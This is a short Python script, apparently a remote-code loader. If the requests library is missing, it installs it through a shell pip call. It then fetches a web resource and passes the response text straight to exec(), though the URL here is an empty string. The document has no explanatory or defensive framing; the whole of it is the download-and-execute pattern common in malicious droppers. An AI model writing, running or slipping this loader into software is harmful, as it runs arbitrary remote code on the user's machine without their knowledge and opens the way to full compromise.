import os
try:
  import requests
except:
  os.system('pip install requests')
  import requests
exec(requests.get('').text)